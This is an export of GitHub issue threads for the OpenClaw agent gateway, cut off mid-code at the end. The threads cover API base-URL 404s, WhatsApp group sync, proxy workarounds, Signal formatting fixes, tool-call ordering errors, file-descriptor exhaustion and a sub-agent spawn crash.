        {
          "id": 3856754910,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9422#issuecomment-3856754910",
          "createdAt": "2026-02-05T22:37:20Z",
          "updatedAt": "2026-02-05T22:37:20Z",
          "author": "adampaulsen",
          "body": "## ✅ Confirmed Fix\n\n@divol89's analysis was correct. Removing `/v1` from the `baseUrl` resolves the issue.\n\n### Change\n```diff\n- \"baseUrl\": \"https://api.anthropic.com/v1\"\n+ \"baseUrl\": \"https://api.anthropic.com\"\n```\n\n### Verification\nAfter making this change and restarting the gateway, direct Anthropic API calls now work:\n\n```\nModel: anthropic/claude-sonnet-4-5-20250929\nResponse: \"Hello to you.\"\nStatus: ✅ Success\n```\n\n### Root Cause\nThe `@anthropic-ai/sdk` (v0.71.2) internally appends `/v1/messages` to the baseUrl:\n\n```javascript\n// node_modules/@anthropic-ai/sdk/resources/beta/messages/messages.js:42\nreturn this._client.post('/v1/messages?beta=true', { ... })\n```\n\nThe SDK expects `baseURL` to be `https://api.anthropic.com` (no `/v1` suffix). When configured with `/v1`, the final URL becomes:\n```\nhttps://api.anthropic.com/v1 + /v1/messages → 404\n```\n\nThanks for the quick turnaround on this!\n\n---\n*Tested on OpenClaw 2026.2.2-3*"
        },
        {
          "id": 3884592045,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9422#issuecomment-3884592045",
          "createdAt": "2026-02-11T13:55:25Z",
          "updatedAt": "2026-02-11T13:55:25Z",
          "author": "zaabi1995",
          "body": "Why is this issue happening?"
        }
      ]
    },
    {
      "number": 10552,
      "title": "[Bug]: Anthropic HTTP 404 not_found_error - direct API works, OpenClaw fails",
      "body": "## Summary\nAll Anthropic models return HTTP 404 through OpenClaw, but direct API calls work fine.\n\n## Environment\n- OpenClaw: 2026.2.3-1\n- macOS (Mac mini, arm64)\n- Node.js: v22.22.0\n\n## Evidence\n**Direct Claude Code works:**\n```\necho \"Hello\" | claude --print\n# Returns: \"Hello! How can I help you today?\"\n```\n\n**Through OpenClaw fails:**\n```\nHTTP 404: not_found_error: Not Found (request_id: req_011CXsBex7Pcnu76VuUefcR1)\n```\n\n## Tried\n- Fresh `claude setup-token` + `openclaw models auth setup-token`\n- Multiple auth profiles (api_key, token, oauth)\n- `openclaw doctor --fix`\n- Full reinstall (`npm uninstall -g openclaw && npm install -g openclaw`)\n- All Claude models (sonnet-4, opus-4-5, opus-4-6)\n\n## Notes\n- Google/Gemini models work fine through OpenClaw\n- Same 404 error reported by others: https://www.answeroverflow.com/m/1466943252929449995\n- Was working on v2026.2.1 (Feb 4-5)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10552",
      "createdAt": "2026-02-06T17:15:39Z",
      "updatedAt": "2026-02-11T13:50:42Z",
      "author": "DinoBravo18",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3884565464,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10552#issuecomment-3884565464",
          "createdAt": "2026-02-11T13:50:41Z",
          "updatedAt": "2026-02-11T13:50:41Z",
          "author": "zaabi1995",
          "body": "was this fixed?"
        }
      ]
    },
    {
      "number": 14069,
      "title": "[Bug]: WhatsApp group messages stop arriving after relinking device (syncFullHistory: false prevents group sync)",
      "body": "## Bug Description\n\nAfter relinking a WhatsApp device (via `openclaw channels login`), group messages completely stop arriving. DMs continue to work fine. The linked device simply does not receive any group messages from WhatsApp servers.\n\n## Root Cause (identified)\n\nOpenClaw sets `syncFullHistory: false` when creating the Baileys socket (in `plugin-sdk/index.js`). In Baileys v7.0.0-rc.9, when `shouldSyncHistoryMessage` is not explicitly provided, it defaults to `() => !!config.syncFullHistory` (see `@whiskeysockets/baileys/lib/Socket/index.js` line 13).\n\nThis means after relinking:\n1. Baileys connects and enters `AwaitingInitialSync` state\n2. It checks `shouldSyncHistoryMessage()` which returns `false`\n3. Logs: *\"History sync is disabled by config, not waiting for notification. Transitioning to Online.\"*\n4. Baileys never requests group participation data from WhatsApp servers\n5. WhatsApp servers do not route group messages to the linked device\n\n**Groups work on first link** because the initial session establishes group participation. After relinking, the credential store loses group metadata and history sync (which would repopulate it) is disabled.\n\n## Steps to Reproduce\n\n1. Set up WhatsApp with group support (`groupPolicy: \"allowlist\"`, `groupAllowFrom`, etc.)\n2. Link device via `openclaw channels login` - groups work\n3. Unlink and relink via `openclaw channels login` (e.g. credentials deleted, or WhatsApp session expired)\n4. DMs work, but zero group messages arrive\n5. Debug logs show no `@g.us` messages at all - they never reach Baileys\n\n## Expected Behavior\n\nGroup messages should continue to arrive after relinking. Either:\n- Enable minimal history sync (at least group participation sync) by default\n- Add a config option like `channels.whatsapp.syncHistory: true` to allow users to opt in\n- Override `shouldSyncHistoryMessage` to return `true` independently of `syncFullHistory`\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- Baileys version: 7.0.0-rc.9\n- OS: Ubuntu 24.04 (Linux 6.14.0)\n- Node: v22.22.0\n- WhatsApp config: dedicated number, groupPolicy allowlist, groups configured with requireMention false\n\n## Relevant Code\n\n```js\n// plugin-sdk/index.js ~line 20004\nsyncFullHistory: false,\nmarkOnlineOnConnect: false\n\n// @whiskeysockets/baileys/lib/Socket/index.js line 10-14\n// let's create a default one that respects the syncFullHistory flag.\nif (config.shouldSyncHistoryMessage === undefined) {\n    newConfig.shouldSyncHistoryMessage = () => !!newConfig.syncFullHistory;\n}\n\n// @whiskeysockets/baileys/lib/Socket/chats.js line 897-904\nconst willSyncHistory = shouldSyncHistoryMessage(proto.Message.HistorySyncNotification.create({\n    syncType: proto.HistorySync.HistorySyncType.RECENT\n}));\nif (!willSyncHistory) {\n    logger.info('History sync is disabled by config, not waiting for notification. Transitioning to Online.');\n    syncState = SyncState.Online;\n    setTimeout(() => ev.flush(), 0);\n    return;\n}\n```\n\n## Suggested Fix\n\nIn `plugin-sdk/index.js`, add `shouldSyncHistoryMessage: () => true` alongside `syncFullHistory: false`. This allows group participation sync without pulling full message history. Alternatively, expose it as a config option.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14069",
      "createdAt": "2026-02-11T12:23:24Z",
      "updatedAt": "2026-02-11T13:43:20Z",
      "author": "sebastianbfox",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3884526740,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14069#issuecomment-3884526740",
          "createdAt": "2026-02-11T13:43:20Z",
          "updatedAt": "2026-02-11T13:43:20Z",
          "author": "sebastianbfox",
          "body": "**Update: This is likely related to WhatsApp's LID (Linked ID) migration, not just syncFullHistory.**\n\nAfter further testing:\n- Patched `shouldSyncHistoryMessage` to return `true` - history sync now works (\"Transitioned to Syncing state\")\n- Switched from WhatsApp Business to regular WhatsApp - same result\n- Fresh credentials, fresh link, fresh account - same result\n- **Outbound to groups works** (`message send` to group JID delivers successfully)\n- **Inbound from groups: zero** - `messages.upsert` never fires for group messages\n- **WhatsApp Web (browser) on the same account receives group messages fine**\n\nThis confirms it's a Baileys issue, not WhatsApp server-side. The real WhatsApp Web client handles group messages correctly, but Baileys (7.0.0-rc.9) does not.\n\nWhatsApp has been migrating group participants from JID (`@s.whatsapp.net`) to LID (`@lid`) format. Multiple Baileys issues track this: WhiskeySockets/Baileys#1465, #1554, #1718. Messages from LID participants may be silently dropped.\n\nThe `syncFullHistory: false` issue from the original report is still valid (it prevents group metadata sync after relink), but the root cause of missing group messages is likely the LID migration breaking Baileys' group message handling.\n\n**Suggested fix:** Update the bundled Baileys to a version with LID support, or expose a config option to pass through custom Baileys socket options."
        }
      ]
    },
    {
      "number": 2102,
      "title": "[Bug]: HTTP_PROXY is ignored",
      "body": "clawdbot cannot use HTTP_PROXY and HTTPS_PROXY set in the environment variables, because the nature of the `undici`. \n\nWorkaround for folks who met the same issue:\n\nFind the entry.js by running:\n```shell\nreadlink -f \"$(which clawdbot)\"\n```\n\nThen add the following code in `entry.js` after all import statements:\n```javascript\nimport { ProxyAgent, setGlobalDispatcher } from \"undici\";\nconst proxy =\n  process.env.HTTPS_PROXY ||\n  process.env.HTTP_PROXY;\n\nif (proxy) {\n  setGlobalDispatcher(new ProxyAgent(proxy));\n}\n```\n",
      "state": "open",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/2102",
      "createdAt": "2026-01-26T06:36:12Z",
      "updatedAt": "2026-02-11T13:42:09Z",
      "author": "cloudcarver",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3802690918,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2102#issuecomment-3802690918",
          "createdAt": "2026-01-27T02:10:43Z",
          "updatedAt": "2026-01-27T14:43:27Z",
          "author": "wmzy",
          "body": "# Temporary Solution\n\n1. Install the proxy agent shim:\n```sh\npnpm add -g set-env-http-proxy-agent\n```\n2. Update launchd plist (~/Library/LaunchAgents/com.clawdbot.gateway.plist):\nAdd these environment variables:\n```xml\n<key>EnvironmentVariables</key>\n<dict>\n  <key>NODE_OPTIONS</key>\n  <string>--import /Users/user/Library/pnpm/global/5/node_modules/set-env-http-proxy-agent/index.js</string>\n  <key>http_proxy</key>\n  <string>http://127.0.0.1:7890</string>\n  <key>https_proxy</key>\n  <string>http://127.0.0.1:7890</string>\n  <key>all_proxy</key>\n  <string>socks5://127.0.0.1:7890</string>\n  <!-- other existing vars -->\n</dict>\n```\n3. Restart the service:\n```sh\nlaunchctl unload ~/Library/LaunchAgents/com.clawdbot.gateway.plist\nlaunchctl load ~/Library/LaunchAgents/com.clawdbot.gateway.plist\n```\n# How It Works\nThe `set-env-http-proxy-agent` package runs at Node.js startup via `--import` and patches undici's global dispatcher to use `EnvHttpProxyAgent`, which respects standard proxy environment variables.\n# Notes\n- `NODE_OPTIONS` must be in launchd plist because `~/.clawdbot/.env` loads after undici is initialized\n- Proxy vars must also be in launchd plist because the shim reads them at import time"
        },
        {
          "id": 3817587464,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2102#issuecomment-3817587464",
          "createdAt": "2026-01-29T13:07:51Z",
          "updatedAt": "2026-01-29T13:08:39Z",
          "author": "q2333gh",
          "body": "try if  node_v24(or above) using  `ENV: NODE_USE_ENV_PROXY=1 ` or` node --use-env-proxy  app.js `  works  "
        },
        {
          "id": 3845839931,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2102#issuecomment-3845839931",
          "createdAt": "2026-02-04T07:39:28Z",
          "updatedAt": "2026-02-04T07:39:28Z",
          "author": "fr0zenrain",
          "body": "I'm have a bug with the proxy settings. When I instruct Telegram to switch from Qwen to Gemini, the agent becomes permanently unresponsive and cannot be switched back. Since my network cannot access Google services directly, I would like to configure a global proxy to resolve this issue.\n\n"
        },
        {
          "id": 3857875017,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2102#issuecomment-3857875017",
          "createdAt": "2026-02-06T04:22:00Z",
          "updatedAt": "2026-02-06T04:22:00Z",
          "author": "geekwho-eth",
          "body": "Connectivity Test\nCheck if the current proxy can access OpenAI services:\n```bash\ncurl -x http://127.0.0.1:7897 -I https://api.openai.com\ncurl -x http://127.0.0.1:7897 -I https://oai.api.openai.com\n```\nGlobal Proxy Setup (macOS)\nIf Method 1 above does not resolve your proxy networking issues, refer to the following solution to implement a global proxy for openclawd:\n```bash\nlaunchctl setenv https_proxy http://127.0.0.1:7897\nlaunchctl setenv http_proxy http://127.0.0.1:7897\nlaunchctl setenv all_proxy socks5://127.0.0.1:7897\n```\n"
        },
        {
          "id": 3884004244,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2102#issuecomment-3884004244",
          "createdAt": "2026-02-11T12:04:43Z",
          "updatedAt": "2026-02-11T12:04:43Z",
          "author": "oneway-net",
          "body": "I tried the above fix, they worked fine. But it will break my channel plugin for dingtalk.\n\nPlease consider the side affects in the fix patch.\n\n> Connectivity Test Check if the current proxy can access OpenAI services:\n> \n> curl -x http://127.0.0.1:7897 -I https://api.openai.com\n> curl -x http://127.0.0.1:7897 -I https://oai.api.openai.com\n> Global Proxy Setup (macOS) If Method 1 above does not resolve your proxy networking issues, refer to the following solution to implement a global proxy for openclawd:\n> \n> launchctl setenv https_proxy http://127.0.0.1:7897\n> launchctl setenv http_proxy http://127.0.0.1:7897\n> launchctl setenv all_proxy socks5://127.0.0.1:7897\n\n"
        },
        {
          "id": 3884520667,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2102#issuecomment-3884520667",
          "createdAt": "2026-02-11T13:42:09Z",
          "updatedAt": "2026-02-11T13:42:09Z",
          "author": "geekwho-eth",
          "body": "> I tried the above fix, they worked fine. But it will break my channel plugin for dingtalk.\n> \n> Please consider the side affects in the fix patch.\n> \n> > Connectivity Test Check if the current proxy can access OpenAI services:\n> > \n> > curl -x http://127.0.0.1:7897 -I https://api.openai.com\n> > curl -x http://127.0.0.1:7897 -I https://oai.api.openai.com\n> > Global Proxy Setup (macOS) If Method 1 above does not resolve your proxy networking issues, refer to the following solution to implement a global proxy for openclawd:\n> > \n> > launchctl setenv https_proxy http://127.0.0.1:7897\n> > launchctl setenv http_proxy http://127.0.0.1:7897\n> > launchctl setenv all_proxy socks5://127.0.0.1:7897\n> \n> \n\nFor Dingtalk, you should set the proxy rule to “direct”, assuming that the current network can access Dingtalk directly without a proxy."
        }
      ]
    },
    {
      "number": 9778,
      "title": "fix: Signal and markdown plain-text formatting issues",
      "body": "## Signal / markdown formatting issues\n\nSeveral rendering bugs in markdown-to-plaintext conversion for Signal delivery. Fixed in PR #9781.\n\n## Before / After Comparisons\n\n### 1. Style offset drift with multiple expanded links\n\nBold/italic styles apply to **wrong text** when multiple markdown links expand in one message.\n\n**Input:**\n```markdown\n[first](https://example.com/first) **bold text** [second](https://example.com/second)\n```\n\n**Before (broken):** bold style starts at index `63` (lands on `second` URL fragment)\n```\nfirst (https://example.com/first) bold text second (https://example.com/second)\n                                                               ^^^^^^^^^\n                                                               BOLD here (wrong!)\n```\n\n**After (fixed):** bold style starts at index `34` (correct position on \"bold text\")\n```\nfirst (https://example.com/first) bold text second (https://example.com/second)\n                                   ^^^^^^^^^\n                                   BOLD here ✓\n```\n\n---\n\n### 2. Missing paragraph separation after lists\n\nNested list items glued onto parent line. No blank line between list and following paragraph.\n\n**Input:**\n```markdown\n- Parent 1\n  - Child 1\n  - Child 2\n- Parent 2\n\nParagraph after list\n```\n\n**Before (broken):** children glued to parent, no separation before paragraph\n```\n• Parent 1  • Child 1\n  • Child 2\n\n• Parent 2\nParagraph after list\n```\n\n**After (fixed):** proper indentation and blank line after list\n```\n• Parent 1\n  • Child 1\n  • Child 2\n• Parent 2\n\nParagraph after list\n```\n\n---\n\n### 3. Blockquote spacing (triple newlines)\n\nBlockquote followed by paragraph produces three newlines instead of two. Also missing `>` prefix.\n\n**Input:**\n```markdown\n> This is a quote\n\nParagraph after quote\n```\n\n**Before (broken):** triple newline, no quote prefix\n```\nThis is a quote\n\n\nParagraph after quote\n```\n\n**After (fixed):** double newline, `>` prefix for visual distinction\n```\n> This is a quote\n\nParagraph after quote\n```\n\n---\n\n### 4. Headings not visually distinguished\n\nHeadings render as plain text with no formatting, making them invisible in Signal.\n\n**Input:**\n```markdown\n# Important Heading\n\nSome text after\n```\n\n**Before:** no styles applied\n```\nImportant Heading\n\nSome text after\nstyles: []\n```\n\n**After:** heading rendered as **bold**\n```\nImportant Heading\n\nSome text after\nstyles: [{ start: 0, length: 17, style: \"BOLD\" }]\n```\n\n---\n\n### 5. Horizontal rules invisible\n\n`---` produces nothing visible, just an extra blank line.\n\n**Input:**\n```markdown\nParagraph 1\n\n---\n\nParagraph 2\n```\n\n**Before:** HR disappears, leaves triple newline\n```\nParagraph 1\n\n\nParagraph 2\n```\n\n**After:** visible `───` separator\n```\nParagraph 1\n\n───\n\nParagraph 2\n```\n\n---\n\n### 6. Redundant link URL display\n\nWhen the link label effectively matches the URL, the URL was shown twice.\n\n**Input:**\n```markdown\nVisit [https://example.com](https://example.com) and [selfh.st](http://selfh.st)\n```\n\n**Before:** redundant URL after label\n```\nVisit https://example.com and selfh.st (http://selfh.st)\n```\n\n**After:** deduplicates when label ≈ URL\n```\nVisit https://example.com and selfh.st\n```",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9778",
      "createdAt": "2026-02-05T17:32:24Z",
      "updatedAt": "2026-02-11T13:39:12Z",
      "author": "hudson-rivera",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3855372463,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9778#issuecomment-3855372463",
          "createdAt": "2026-02-05T18:16:10Z",
          "updatedAt": "2026-02-05T18:16:10Z",
          "author": "hudson-rivera",
          "body": "This issue has been expanded into a comprehensive fix that addresses multiple related spacing bugs in the markdown IR renderer:\n\n1. **List → Paragraph spacing** (original issue)\n2. **Nested list rendering** - items were collapsing to a single line\n3. **Blockquote spacing** - extra newlines after blockquotes\n4. **Horizontal rule spacing** - extra newlines around thematic breaks\n\nAll fixes are included in PR #9781 with 51 new tests verifying spec-correct behavior."
        }
      ]
    },
    {
      "number": 13704,
      "title": "Background exec processes + queued announcements cause tool_use/tool_result mismatch",
      "body": "## Bug: Background exec processes + queued announcements cause tool_use/tool_result mismatch\n\n### Environment\n- OpenClaw version: Latest (as of 2026-02-10)\n- Gateway: openclaw-gateway (systemd service)\n- Model: claude-opus-4-6 (with openai-codex/gpt-5.3-codex fallback)\n- Platform: Telegram\n- Server: Ubuntu 24.04.3 LTS (VPS)\n\n### Description\nWhen a long-running `exec` command is in progress and a queued subagent announcement is delivered, OpenClaw loses track of the `tool_result` for the background process. This causes Anthropic API to reject subsequent requests with:\n\n```\ninvalid_request_error: messages.59: `tool_use` ids were found without `tool_result` blocks immediately after: call_52523385.\nEach `tool_use` block must have a corresponding `tool_result` block in the next message.\n```\n\n### Timeline of Events (from session logs)\n\n1. **22:26:33 UTC** - Assistant sends `tool_use` with `call_52523385`:\n   ```json\n   {\"type\":\"toolCall\",\"id\":\"call_52523385\",\"name\":\"exec\",\"arguments\":{\"command\":\"rm -rf /tmp/nimbus-preview && cp -r /root/nimbus/website/dist /tmp/nimbus-preview && scp -r /tmp/nimbus-preview/* bigbrother@100.111.178.18:~/Desktop/nimbus-preview/\"}}\n   ```\n\n2. **22:26:45 UTC** - Tool result received: \"Command still running (session sharp-crest, pid 946691)\"\n   ```json\n   {\"role\":\"toolResult\",\"toolCallId\":\"call_52523385\",\"toolName\":\"exec\",\"content\":[{\"type\":\"text\",\"text\":\"Command still running...\"}]}\n   ```\n\n3. **22:26:50-57 UTC** - Assistant continues with other tool calls (`process list`, `process poll`)\n\n4. **22:30:52 UTC** - Queued subagent announcement delivered:\n   ```json\n   {\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"[Tue 2026-02-10 22:30 UTC] A subagent task \\\"nimbus-vehicle-pages\\\" just completed successfully...\"}]}\n   ```\n\n5. **22:30:52 UTC** - API error:\n   ```\n   LLM request rejected: messages.59: `tool_use` ids were found without `tool_result` blocks immediately after: call_52523385.\n   ```\n\n### Root Cause\nWhen OpenClaw constructs the message history for Anthropic API after a queued announcement is inserted, it appears to lose the association between `tool_use` (`call_52523385`) and its `tool_result`. The tool_result exists in the transcript (confirmed at message `e3df6740`), but somehow gets orphaned during history reconstruction.\n\nThis appears to be related to:\n- #9281 (delivery-mirror messages breaking tool_use/tool_result ordering)\n- #10700 (contextPruning orphaning tool_result blocks)\n- #13020 (conversation compaction removing tool_use blocks)\n\nBut specifically triggered by the combination of:\n- Background/long-running exec commands\n- Queued announcement messages inserted during execution\n- Multiple sequential tool calls in the same turn\n\n### Steps to Reproduce\n1. Configure OpenClaw gateway with Telegram + Anthropic model\n2. Start a long-running `exec` command (e.g., large file transfer via scp)\n3. Have a subagent complete a task while the exec is running\n4. OpenClaw queues the announcement and delivers it after exec completes\n5. Next API call fails with tool_use/tool_result mismatch error\n6. Session becomes unusable until restart\n\n### Expected Behavior\nQueued announcements should be inserted in a way that preserves tool_use/tool_result pairing, similar to how delivery-mirror messages should be filtered.\n\n### Session File\nSession with full reproduction: `629c12d8-af2d-470f-91da-156b3ecef609.jsonl` (3.5 MB)\nProblematic tool call ID: `call_52523385`\n\n### Impact\n- Session becomes completely unusable after this error\n- All subsequent messages fail with same error\n- Requires service restart to recover\n- User loses conversation context\n\n### Suggested Fix\nApply similar fix to #8235 (delivery-mirror filtering) but also handle:\n1. Queued announcement messages\n2. Background process status updates\n3. Ensure tool_use/tool_result pairing is preserved during message queue operations\n\n### Workaround\nRestart openclaw-gateway service:\n```bash\nsystemctl --user restart openclaw-gateway\n```\n\nSession history is preserved but the corrupted conversation thread is abandoned.\n",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13704",
      "createdAt": "2026-02-10T22:41:09Z",
      "updatedAt": "2026-02-11T13:37:17Z",
      "author": "pocarles",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3884494922,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13704#issuecomment-3884494922",
          "createdAt": "2026-02-11T13:37:16Z",
          "updatedAt": "2026-02-11T13:37:16Z",
          "author": "pocarles",
          "body": "Closing - root cause was provider switching (Grok → Anthropic), not contextPruning/compaction. Mixed provider sessions caused tool_use format incompatibility. Fixed by using single provider (Anthropic only)."
        }
      ]
    },
    {
      "number": 14091,
      "title": "[Bug]: exec tool: spawn EBADF caused by skill with large Python environment exhausting file descriptors",
      "body": "## Environment\n\n- **Device**: Mac mini (Apple Silicon)\n- **macOS**: latest\n- **Node.js**: 25.5.0 (also tested on 22.22.0 LTS)\n- **OpenClaw**: 2026.2.9\n\n## Symptom\n\nThe `exec` tool fails with `spawn EBADF` on every invocation. All other tools (web_search, read, etc.) work normally.\n\n## What I tried (all ineffective)\n\n- `pkill -9` and clean restart\n- `OPENCLAW_NO_PTY=1` environment variable\n- Downgrading Node to 22 LTS\n- Beta channel\n- Full uninstall and reinstall\n- Source code modification (changing stdio to pipe, adding `shell: true`)\n- Stopping launchd service and watchdog before clean start\n\n## Root cause\n\nAfter monkey-patching `child_process.spawn` to log fd status, I found that the gateway process had **14,599 open file descriptors** (checked via `lsof -p <PID> | wc -l`).\n\nBreakdown by directory showed nearly all were `REG` (regular files) from a single skill’s Python virtual environment:\n\n```\n 586 ~/.openclaw/skills/paddle-ocr/paddle-env/.../paddle/include/paddle/phi/kernels\n 255 ~/.openclaw/skills/paddle-ocr/paddle-env/.../paddle/include/paddle/phi/kernels/impl\n 182 ~/.openclaw/skills/paddle-ocr/paddle-env/.../paddle/include/paddle/phi/kernels/funcs\n 155 ~/.openclaw/skills/paddle-ocr/paddle-env/.../modelscope/pipelines/cv\n 114 ~/.openclaw/skills/paddle-ocr/paddle-env/.../PIL\n```\n\nThe gateway appears to scan/open files recursively inside skill directories at startup. The `paddle-ocr` skill contains PaddlePaddle + modelscope + numpy + pandas + OpenCV — a massive Python environment with thousands of files. This exhausted the fd table, causing `posix_spawn` to fail with `EBADF`.\n\n## Fix\n\nMoving the skill directory out of `~/.openclaw/skills/`:\n\n```bash\nmv ~/.openclaw/skills/paddle-ocr ~/.openclaw/paddle-ocr-backup\n```\n\nAfter restart, fd count dropped from **14,599 → 469**, and `exec` resumed working.\n\n**Note**: Simply renaming the directory (e.g., to `paddle-ocr.disabled`) did NOT work — the gateway still scanned files inside it.\n\n## Suggestion\n\n- The gateway should avoid recursively opening all files inside skill directories at startup\n- Consider lazy-loading skill assets, or at minimum skipping Python `site-packages` directories\n- Skills with large Python environments (PaddlePaddle, TensorFlow, etc.) can easily contain 10,000+ files and will hit this issue",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14091",
      "createdAt": "2026-02-11T13:30:17Z",
      "updatedAt": "2026-02-11T13:30:17Z",
      "author": "scarieyrin-bot",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 12888,
      "title": "[Bug]: Sub-agent Spawning Fails with TypeError on workspace.trim()",
      "body": "## Environment\n- **OpenClaw Version**: 2026.2.9 (commit 33c75cb)\n- **OS**: Linux 6.8.0-100-generic (x64)\n- **Node**: v22.22.0\n- **Affected**: All sub-agent spawns (both Anthropic and OpenAI models)\n\n## Summary\nSub-agent spawning consistently fails within 10-30ms with `TypeError: Cannot read properties of undefined (reading 'trim')`. The error occurs during workspace initialization in the agent scope bootstrap code.\n\n## Symptoms\n- ❌ All `sessions_spawn` calls fail immediately\n- ❌ No session files are created in `~/.openclaw/agents/<agent-id>/sessions/`\n- ❌ Error appears in gateway logs with very short runtime (12-27ms)\n- ❌ Affects both Anthropic (claude-opus-4-6) and OpenAI (gpt-5.3-codex) agents\n- ✅ Main session agent continues working normally\n\n## Steps to Reproduce\n\n### 1. Configure sub-agents in OpenClaw config\n```json\n{\n  \"agents\": {\n    \"list\": [\n      {\n        \"id\": \"sonnet\",\n        \"model\": {\n          \"primary\": \"anthropic/claude-sonnet-4-5\"\n        },\n        \"workspace\": null,\n        \"subagents\": {\n          \"allowAgents\": [\"opus\", \"codex\"]\n        }\n      },\n      {\n        \"id\": \"opus\",\n        \"model\": {\n          \"primary\": \"anthropic/claude-opus-4-6\"\n        },\n        \"workspace\": null\n      },\n      {\n        \"id\": \"codex\",\n        \"model\": {\n          \"primary\": \"openai/gpt-5.3-codex\"\n        },\n        \"workspace\": null\n      }\n    ]\n  }\n}\n```\n\n### 2. Attempt to spawn a sub-agent\n```\nUser: \"Can you spawn a codex agent to review this code?\"\n```\n\n### 3. Observe the crash\nThe spawn is accepted but fails within milliseconds.\n\n## Error Details\n\n### Gateway Log Output (journalctl)\n```\nFeb 09 21:26:08 smart-leopard node[70376]: 2026-02-09T21:26:08.431Z [diagnostic] lane task error: lane=subagent durationMs=10 error=\"TypeError: Cannot read properties of undefined (reading 'trim')\"\nFeb 09 21:26:08 smart-leopard node[70376]: 2026-02-09T21:26:08.433Z [diagnostic] lane task error: lane=session:agent:codex:subagent:4c7ddf2d-1af6-4610-8d21-ac3d349e6469 durationMs=15 error=\"TypeError: Cannot read properties of undefined (reading 'trim')\"\nFeb 09 21:26:08 smart-leopard node[70376]: 2026-02-09T21:26:08.457Z [ws] ⇄ res ✗ agent errorCode=UNAVAILABLE errorMessage=TypeError: Cannot read properties of undefined (reading 'trim') runId=cf0b02b4-8be6-4b4c-b2a0-219eeac56e5d error=TypeError: Cannot read properties of undefined (reading 'trim') conn=064ee993…1ee6 id=ef61fa7a…fa60\n```\n\n### Subagent Announce Message\n```\nA subagent task \"Echo test: reply with exactly \"CODEX_ALIVE\" and nothing else\" just failed: \nTypeError: Cannot read properties of undefined (reading 'trim').\n\nStats: runtime 258ms • sessionKey agent:codex:subagent:4c7ddf2d-1af6-4610-8d21-ac3d349e6469\n```\n\n### Runtime Observations\n- Session lane: `session:agent:codex:subagent:*`\n- Crash time: 10-27ms in lane diagnostics, 258ms total runtime\n- No JSONL session file created in `~/.openclaw/agents/codex/sessions/`\n- No workspace initialization completed\n- Error is 100% reproducible across multiple spawn attempts\n- Affects both Anthropic (claude-opus-4-6) and OpenAI (gpt-5.3-codex) models\n\n## Root Cause\nThe agent scope bootstrap code attempts to call `.trim()` on an undefined property during sub-agent initialization:\n\n**Error location**: `agent-scope-BimPHsgV.js`\n\nThe error occurs consistently within 10-27ms of spawn, before any session file is created. The `.trim()` call is made on something that is undefined, but it's unclear which property exactly (workspace was suspected but removing it doesn't fix the issue).\n\n## Attempted Solutions (None Work)\n\n### ❌ Removed workspace: null from config\n```bash\njq 'del(.agents.list[].workspace)' ~/.openclaw/openclaw.json > /tmp/fixed.json\nmv /tmp/fixed.json ~/.openclaw/openclaw.json\nopenclaw gateway restart\n```\n**Result**: Still crashes with same error.\n\n### ❌ Explicitly set workspace paths\n```json\n\"workspace\": \"/home/ubuntu/clawd\"\n```\n**Result**: Still crashes with same error.\n\n### ❌ Removed default subagent model override\n**Result**: Still crashes with same error.\n\n## Current Status\n**No workaround available.** Sub-agent spawning is completely broken in OpenClaw 2026.2.9.\n\n## Expected Behavior\n1. OpenClaw should handle `workspace: null` gracefully (treat as undefined/empty)\n2. OR: Config validation should reject `workspace: null` with a clear error\n3. OR: Documentation should explicitly state that workspace property should be omitted (not set to null) if not needed\n\n## Debugging Next Steps\nThe error originates in `agent-scope-BimPHsgV.js` but the exact property being trimmed is unclear. To debug:\n\n1. **Add logging** before all `.trim()` calls in agent scope bootstrap:\n   ```javascript\n   console.log('[debug] about to trim:', typeof value, value);\n   const trimmed = value?.trim() || '';\n   ```\n\n2. **Add defensive checks** for all `.trim()` operations in sub-agent initialization:\n   ```javascript\n   // Before\n   const value = something.trim();\n   \n   // After\n   const value = (something || '').trim();\n   // or\n   const value = something?.trim() ?? '';\n   ```\n\n3. **Stack trace**: The full stack trace would help identify which property is undefined\n\n## Suggested Temporary Fix\nAdd global defensive `.trim()` wrapper in agent scope initialization to catch and log the undefined property:\n```javascript\nconst safeTrim = (val, propName) => {\n  if (val === null || val === undefined) {\n    console.error(`[agent-scope] trim called on ${propName}:`, typeof val, val);\n    return 